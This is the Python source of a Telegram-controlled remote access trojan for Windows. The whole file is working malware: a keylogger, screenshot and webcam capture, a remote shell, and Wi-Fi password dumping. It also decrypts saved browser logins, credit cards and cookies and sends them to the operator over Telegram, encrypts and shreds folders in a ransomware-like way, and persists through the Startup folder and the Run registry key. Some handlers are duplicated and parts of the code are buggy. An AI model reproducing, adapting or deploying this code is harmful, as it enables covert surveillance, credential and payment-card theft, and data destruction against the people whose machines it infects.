import os
import re
import mss
import cv2
import time
import pyttsx3
import telebot
import platform
import clipboard
import subprocess
import pyAesCrypt
import xml.etree.ElementTree as ET
from secure_delete import secure_delete
from pynput import keyboard
import threading
import sys
import requests
import multiprocessing 
import signal
import shutil
import ctypes
from retrying import retry
import concurrent.futures
from tabulate import tabulate
import tempfile
import base64
import json
import sqlite3
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    pass
else:
    print("Please Run With Administrator..!!")
    sys.exit(0)

TOKEN = '' 
AUTH_Password = "" 

bot = telebot.TeleBot(TOKEN)
cd = os.path.expanduser("~")
secure_delete.secure_random_seed_init()
bot.set_webhook()

authenticated = False
@bot.message_handler(commands=['auth'])
def authenticate_user(message):
    global authenticated
    args = message.text.split(' ')
    if len(args) >= 2:
        # Check if the user provided the correct password
        password = message.text.split(' ')[1]  # Assuming the password is passed as an argument
        # Replace with your actual password
        if password == AUTH_Password:
            authenticated = True
            bot.send_message(message.chat.id, "Authentication successful. You are now authenticated.")
        else:
            bot.send_message(message.chat.id, "Authentication failed. Please provide the correct password.")
    else:
        bot.send_message(message.chat.id, "/auth [Enter Your Password To Start Conversation].")            



@bot.message_handler(commands=['start'])
def start(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    start_text= "Welcome to The B14CKY's RAT Bot.....\nType /help to see commands"
    bot.send_message(message.chat.id, start_text)
    

@bot.message_handler(commands=['help'])
def help(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    help_menu = """
Welcome! Here are the available commands:

/auth [Authentication Password] -  Authetication for Starting conversation 
/screen                 - Capture a screenshot.
/sys                    - Get system information.
/ip                     - Get Public IP address.
/cd                     - Navigate through folders.
/ls                     - List elements.
/upload [Your Path] [Victim's Path]          - Upload a file.
/download [Victim's File Path]  - Download The File
/crypt [path] [Password]        - Encrypt folder's files.
/decrypt [path] [Password]      - Decrypt folder's files.
/webcam                 - Capture from webcam.
/lock                   - Lock Windows session.
/clipboard              - Get clipboard content.
/shell                  - Access remote shell.
/wifi                   - Get saved Wi-Fi credentials.
/speech [text]          - Convert text to speech.
/shutdown               - Shutdown system.
/start_keylogging       - Start keylogging.
/stop_keylogging        - Stop keylogging (Try 3 to 4 Times).
/timeinterval [seconds] - Set time interval for keylogging.
/enable_persistence     - Enable persistence.
/send_browser_info [DATA_TYPE]      -  Sending Sensitive Info of Browser
/supported_browser      - List out the supported browsers
    """
    bot.send_message(message.chat.id, help_menu)

@bot.message_handler(commands=['screen'])
def send_screen(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    with mss.mss() as sct:
        sct.shot(output=f"{cd}\capture.png")
                              
    image_path = f"{cd}\capture.png"
    print(image_path)
    with open(image_path, "rb") as photo:
        bot.send_photo(message.chat.id, photo)
   

@bot.message_handler(commands=['ip'])
def send_ip_info(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    try:
        command_ip = "curl ipinfo.io/ip"
        result = subprocess.check_output(command_ip, shell=True)
        public_ip = result.decode("utf-8").strip()
        bot.send_message(message.chat.id, public_ip)
    except:
        bot.send_message(message.chat.id, 'error')

@bot.message_handler(commands=['sys'])
def send_system_info(message):
    system_info = {
        'Platform': platform.platform(),
        'System': platform.system(),
        'Node Name': platform.node(),
        'Release': platform.release(),
        'Version': platform.version(),
        'Machine': platform.machine(),
        'Processor': platform.processor(),
        'CPU Cores': os.cpu_count(),
        'Username': os.getlogin(),
    }
    system_info_text = '\n'.join(f"{key}: {value}" for key, value in system_info.items())
    bot.send_message(message.chat.id, system_info_text)


@bot.message_handler(commands=['ls'])
def list_directory(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    try:
        contents = os.listdir(cd)
        if not contents:
            bot.send_message(message.chat.id, "folder is empty.")
        else:
            response = "Directory content :\n"
            for item in contents:
                response += f"- {item}\n"
            bot.send_message(message.chat.id, response)
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")


@bot.message_handler(commands=['cd'])
def change_directory(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    try:
        global cd 
        args = message.text.split(' ')
        if len(args) >= 2:
            new_directory = args[1]
            new_path = os.path.join(cd, new_directory)
            if os.path.exists(new_path) and os.path.isdir(new_path):
                cd = new_path
                bot.send_message(message.chat.id, f"you are in : {cd}")
            else:
                bot.send_message(message.chat.id, f"The directory does not exist.")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. : USE /cd [folder name]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")


@bot.message_handler(commands=['upload'])
def handle_upload_command(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    try:
        args = message.text.split(' ')
        if len(args) >= 2:
            file_path = args[1]
            upload_directory = args[2]

            if os.path.exists(file_path):
                filename = os.path.basename(file_path)
                save_path = os.path.join(upload_directory, filename)
                shutil.copy(file_path, save_path)
                
                bot.send_message(message.chat.id, f"File has been transferred successfully to {upload_directory}.")
            else:
                bot.send_message(message.chat.id, "The specified path does not exist.")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. Use /upload [PATH]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['download'])
def handle_download_command(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    try:
        args = message.text.split(' ')
        if len(args) >= 2:
            file_path = args[1]

            if os.path.exists(file_path) and os.path.isfile(file_path):
                with open(file_path, 'rb') as file:
                    bot.send_document(message.chat.id, file)
                bot.send_message(message.chat.id, f"File has been uploaded successfully.")
            else:
                bot.send_message(message.chat.id, "The specified file path does not exist.")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. Use /download [FILE_PATH]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")


@bot.message_handler(commands=['crypt'])
def encrypt_folder(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    try:
        if len(message.text.split()) >= 2:
            folder_to_encrypt = message.text.split()[1]
            password = message.text.split()[2]

            for root, dirs, files in os.walk(folder_to_encrypt):
                for file in files:
                    file_path = os.path.join(root, file)
                    encrypted_file_path = file_path + '.crypt'
                  
                    pyAesCrypt.encryptFile(file_path, encrypted_file_path, password)
                   
                    if not file_path.endswith('.crypt'):
                       
                        secure_delete.secure_delete(file_path)
            
            bot.send_message(message.chat.id, "Folder encrypted, and original non-encrypted files securely deleted successfully.")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. Use /crypt [FOLDER_PATH] [PASSWORD]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")


@bot.message_handler(commands=['decrypt'])
def decrypt_folder(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    try:
       
        if len(message.text.split()) >= 2:
            folder_to_decrypt = message.text.split()[1]
            password = message.text.split()[2]
      
            for root, dirs, files in os.walk(folder_to_decrypt):
                for file in files:
                    if file.endswith('.crypt'):
                        file_path = os.path.join(root, file)
                        decrypted_file_path = file_path[:-6] 
                       
                        pyAesCrypt.decryptFile(file_path, decrypted_file_path, password)               
                        
                        secure_delete.secure_delete(file_path)
            
            bot.send_message(message.chat.id, "Folder decrypted, and encrypted files deleted successfully..")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. Use /decrypt [ENCRYPTED_FOLDER_PATH] [PASSWORD]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")


@bot.message_handler(commands=['lock'])
def lock_command(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    try:

        result = subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        if result.returncode == 0:
            bot.send_message(message.chat.id, "windows session succefuly locked.")
        else:
            bot.send_message(message.chat.id, "Impossible to lock windows session.")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")

shutdown_commands = [
    ['shutdown', '/s', '/t', '5'],
    ['shutdown', '-s', '-t', '5'],
    ['shutdown.exe', '/s', '/t', '5'],
    ['shutdown.exe', '-s', '-t', '5'],
]

@bot.message_handler(commands=['shutdown'])
def shutdown_command(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    try:
        success = False
        for cmd in shutdown_commands:
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode == 0:
                success = True
                break
        
        if success:
            bot.send_message(message.chat.id, "shutdown in 5 seconds.")
        else:
            bot.send_message(message.chat.id, "Impossible to shutdown.")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")

@bot.message_handler(commands=['webcam'])
def capture_webcam_image(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    try:
        
        cap = cv2.VideoCapture(0)

    
        if not cap.isOpened():
            bot.send_message(message.chat.id, "Error: Unable to open the webcam.")
        else:
            
            ret, frame = cap.read()

            if ret:
                
                cv2.imwrite("webcam.jpg", frame)

              
                with open("webcam.jpg", 'rb') as photo_file:
                    bot.send_photo(message.chat.id, photo=photo_file)
                
                os.remove("webcam.jpg")  
            else:
                bot.send_message(message.chat.id, "Error while capturing the image.")

        cap.release()

    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")


@bot.message_handler(commands=['speech'])
def text_to_speech_command(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    try:
       
        text = message.text.replace('/speech', '').strip()
        
        if text:
           
            pyttsx3.speak(text)
            bot.send_message(message.chat.id, "succesful say.")
        else:
            bot.send_message(message.chat.id, "Use like this. Utilisez /speech [TEXTE]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")


@bot.message_handler(commands=['clipboard'])
def clipboard_command(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    try:
      
        clipboard_text = clipboard.paste()

        if clipboard_text:
          
            bot.send_message(message.chat.id, f"Clipboard content :\n{clipboard_text}")
        else:
            bot.send_message(message.chat.id, "clipboard is empty.")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")


user_states = {}


STATE_NORMAL = 1
STATE_SHELL = 2

@bot.message_handler(commands=['shell'])
def start_shell(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    user_id = message.from_user.id
    user_states[user_id] = STATE_SHELL
    bot.send_message(user_id, "You are now in the remote shell interface. Type 'exit' to exit.")

@bot.message_handler(func=lambda message: get_user_state(message.from_user.id) == STATE_SHELL)
def handle_shell_commands(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    user_id = message.from_user.id
    command = message.text.strip()

    if command.lower() == 'exit':
        bot.send_message(user_id, "Exiting remote shell interface.")
        user_states[user_id] = STATE_NORMAL
    else:
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()

            if stdout:
                output = stdout.decode('utf-8', errors='ignore')
                bot.send_message(user_id, f"Command output:\n{output}")
            if stderr:
                error_output = stderr.decode('utf-8', errors='ignore')
                bot.send_message(user_id, f"Command error output:\n{error_output}")
        except Exception as e:
            bot.send_message(user_id, f"An error occurred: {str(e)}")

def get_user_state(user_id):
    return user_states.get(user_id, STATE_NORMAL)

@bot.message_handler(func=lambda message: get_user_state(message.from_user.id) == STATE_SHELL)
def handle_shell_commands(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    user_id = message.from_user.id
    command = message.text.strip()

    if command.lower() == 'exit':
        bot.send_message(user_id, "Exiting remote shell interface.")
        user_states[user_id] = STATE_NORMAL
    else:
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()

            if stdout:
                output = stdout.decode('utf-8', errors='ignore')
                send_long_message(user_id, f"Command output:\n{output}")
            if stderr:
                error_output = stderr.decode('utf-8', errors='ignore')
                send_long_message(user_id, f"Command error output:\n{error_output}")
        except Exception as e:
            bot.send_message(user_id, f"An error occurred: {str(e)}")


def send_long_message(user_id, message_text):
    part_size = 4000  
    message_parts = [message_text[i:i+part_size] for i in range(0, len(message_text), part_size)]

    for part in message_parts:
        bot.send_message(user_id, part)



def get_wifi_passwords(message):
    def get_wifi_password(wifi_name):
        try:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi_name, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
            password = next((line.split(":")[1].strip() for line in results if "Key Content" in line), None)
            return (wifi_name, password)
        except subprocess.CalledProcessError:
            return (wifi_name, None)

    wifi_names = []
    for line in subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n'):
        if "All User Profile" in line:
            wifi_names.append(line.split(":")[1].strip())

    wifi_data = {}

    with concurrent.futures.ThreadPoolExecutor() as executor:
        results = list(executor.map(get_wifi_password, wifi_names))

    for wifi_name, password in results:
        wifi_data[wifi_name] = password

    table = tabulate(wifi_data.items(), headers=['Wi-Fi Name', 'Password'], tablefmt='grid')
    
    with tempfile.NamedTemporaryFile(mode='w', delete=False) as temp_file:
        temp_file.write(f"Here are the Wi-Fi passwords:\n\n{table}")
    
    with open(temp_file.name, 'rb') as file:
        bot.send_document(message.chat.id, file)

    os.unlink(temp_file.name)

@bot.message_handler(commands=['wifi'])
def wifi_command(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    get_wifi_passwords(message)


time_interval = 10

@bot.message_handler(commands=['timeinterval'])
def set_time_interval_command(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    global time_interval
    try:
        interval = int(message.text.split()[1])
        if interval > 0:
            time_interval = interval
            bot.send_message(message.chat.id, "Time interval set to {} seconds.".format(time_interval))
        else:
            bot.send_message(message.chat.id, "Please specify a positive interval.")
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "Usage: /timeinterval [seconds]")


keystrokes = []
keylogger_running = False
def start_keylogger(message):
    global keylogger_running
    keylogger_running = True
    bot.reply_to(message, "Keylogger Started...")

    def on_key_press(key):
        try:
            keystrokes.append(key.char)
        except AttributeError:
            if str(key) == 'Key.space':
                keystrokes.append(' ')
            elif str(key) == 'Key.enter':
                keystrokes.append('\n')
            elif str(key) == 'Key.shift':
                keystrokes.append('')
            else:
                keystrokes.append(f'[{str(key)}]')


    keylogger_thread = threading.Thread(target=run_keylogger, args=(message.chat.id,))
    keylogger_thread.start()

    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

def stop_keylogger():
    global keylogger_running
    keylogger_running = False
    keystrokes = []

def run_keylogger(char_id):
    global keystrokes, keylogger_running
    while keylogger_running:
        time.sleep(time_interval)  
        if keystrokes:
            keylog = ''.join(keystrokes)
            bot.send_message(char_id, keylog)
            keystrokes = []



@bot.message_handler(commands=['start_keylogging'])
def start_keylogging_command(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    start_keylogger(message)

@bot.message_handler(commands=['stop_keylogging'])
def stop_keylogging_command(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    stop_keylogger()
    bot.reply_to(message, "Keylogger Stopped...")



def enable_persistence(message):
    try:
        exe_file_path = "tinar.exe"
        startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        shutil.copy(exe_file_path, startup_folder)      
        bot.reply_to(message, "Persistence enabled. The program will run at startup.")  
        registry_key = r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
        subprocess.call(["reg", "add", registry_key, "/v", "Keylogger", "/t", "REG_SZ", "/d", exe_file_path])
        bot.reply_to(message, "Persistence enabled. The program will added in registry.")
    except Exception as e:
        bot.reply_to(message, f"Error enabling persistence: {str(e)}")


@bot.message_handler(commands=['enable_persistence'])
def enable_persistence_command(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    enable_persistence(message)


def get_temp_directory():
    return tempfile.mkdtemp()


appdata = os.getenv('LOCALAPPDATA')
browsers = {
        'avast': appdata + '\\AVAST Software\\Browser\\User Data',
        'amigo': appdata + '\\Amigo\\User Data',
        'torch': appdata + '\\Torch\\User Data',
        'kometa': appdata + '\\Kometa\\User Data',
        'orbitum': appdata + '\\Orbitum\\User Data',
        'cent-browser': appdata + '\\CentBrowser\\User Data',
        '7star': appdata + '\\7Star\\7Star\\User Data',
        'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
        'vivaldi': appdata + '\\Vivaldi\\User Data',
        'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
        'google-chrome': appdata + '\\Google\\Chrome\\User Data',
        'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
        'microsoft-edge': appdata + '\\e\\Edge\\User Data',
        'uran': appdata + '\\uCozMedia\\Uran\\User Data',
        'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
        'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\',
        'iridium': appdata + '\\Iridium\\User Data',
    }
def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available

data_queries = {
        'login_data': {
            'query': 'SELECT action_url, username_value, password_value FROM logins',
            'file': '\\Login Data',
            'columns': ['URL', 'Email', 'Password'],
            'decrypt': True
        },
        'credit_cards': {
            'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
            'file': '\\Web Data',
            'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
            'decrypt': True
        },
        'cookies': {
            'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
            'file': '\\Network\\Cookies',
            'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
            'decrypt': True
        },
        'history': {
            'query': 'SELECT url, title, last_visit_time FROM urls',
            'file': '\\History',
            'columns': ['URL', 'Title', 'Visited Time'],
            'decrypt': False
        },
        'downloads': {
            'query': 'SELECT tab_url, target_path FROM downloads',
            'file': '\\History',
            'columns': ['Download URL', 'Local Path'],
            'decrypt': False
        }
    }
def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key

def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass

def save_results(browser_name, type_of_data, content):
    if content is not None:
        temp_dir = get_temp_directory()
        file_path = os.path.join(temp_dir, f'{browser_name}_{type_of_data}.txt')

        with open(file_path, 'w', encoding="utf-8") as file:
            file.write(content)
            print(f"\t [*] Saved in {file_path}")

        return file_path
    else:
        print(f"\t [-] No Data Found!")
        return None



def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return
    result = ""
    try:
        shutil.copy(db_file, 'temp_db')
        conn = sqlite3.connect('temp_db')
        cursor = conn.cursor()
        cursor.execute(type_of_data['query'])
        for row in cursor.fetchall():
            row = list(row)
            if type_of_data['decrypt']:
                for i in range(len(row)):
                    if isinstance(row[i], bytes):
                        row[i] = decrypt_password(row[i], key)
            if data_type_name == 'history':
                if row[2] != 0:
                    row[2] = convert_chrome_time(row[2])
                else:
                    row[2] = "0"
            result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
        conn.close()
        os.remove('temp_db')
        return result
    except PermissionError as e:
        print(f"\t [-] Permission error: {e}")
        return None
    except Exception as e:
        print(f"\t [-] An error occurred: {e}")
        return None

def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available

available_browsers = installed_browsers()

for browser in available_browsers:
    browser_path = browsers[browser]
    master_key = get_master_key(browser_path)
    print(f"Getting Stored Details from {browser}")

    for data_type_name, data_type in data_queries.items():
        print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
        data = get_data(browser_path, "Default", master_key, data_type)
        save_results(browser, data_type_name, data)
        print("\t------\n")

@bot.message_handler(commands=['send_browser_info'])
def handle_send_browser_info_command(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    try:
        args = message.text.split(' ')
        if len(args) >= 2:
            data_type = args[1].lower()

            if data_type in data_queries:
                available_browsers = installed_browsers()
                results = {}

                for browser in available_browsers:
                    browser_path = browsers[browser]
                    master_key = get_master_key(browser_path)
                    print(f"Getting Stored Details from {browser}")

                    data = get_data(browser_path, "Default", master_key, data_queries[data_type])
                    if data:
                        results[browser] = data
                        print(f"\t [!] Preparing {data_type.replace('_', ' ').capitalize()} from {browser}")

                if results:
                    bot.send_message(message.chat.id, f"Here are the {data_type.replace('_', ' ').capitalize()} from installed browsers:")
                   
                    for browser, data in results.items():
                        bot.send_message(message.chat.id, f"Data from {browser}:")

                        temp_dir = get_temp_directory()
                        file_path = os.path.join(temp_dir, f'{browser}_{data_type}.txt')

                        with open(file_path, 'w', encoding='utf-8') as file:
                            file.write(data)

                        with open(file_path, 'rb') as file:
                            bot.send_document(message.chat.id, file, caption=f"{browser} - {data_type}")
                        
                        os.remove(file_path)
                    
                    # shutil.rmtree(file_path)

                else:
                    bot.send_message(message.chat.id, f"No {data_type.replace('_', ' ').capitalize()} data found in installed browsers.")
            else:
                bot.send_message(message.chat.id, "Invalid data type. Use one of: login_data, credit_cards, cookies, history, downloads")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. Use /send_browser_info [DATA_TYPE]\nlogin_data, credit_cards, cookies, history, downloads")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['supported_browser'])
def supported_browsers_command(message):
    global authenticated
    if not authenticated:
        bot.send_message(message.chat.id, "Authentication required. Please use /auth to authenticate.")
        return
    browsers = """
Avast
Amigo
Torch
Kometa
Orbitum
Cent-browser
7star
Sputnik
Vivaldi
Google-chrome-sxs
Google-chrome
Epic-privacy-browser
Microsoft-edge
Uran
Yandex
Brave
Iridium
"""
    bot.send_message(message.chat.id, browsers)



@retry(wait_fixed=2000, stop_max_attempt_number=5)
def poll_telegram_bot():
    try:
        bot.infinity_polling()
    except requests.exceptions.ConnectTimeout:
        raise Exception("Max retries exceeded with ConnectTimeoutError")

if __name__ == "__main__":
    print('Waiting for commands...')
    try:
        poll_telegram_bot()
    except:
        time.sleep(15)
        pass
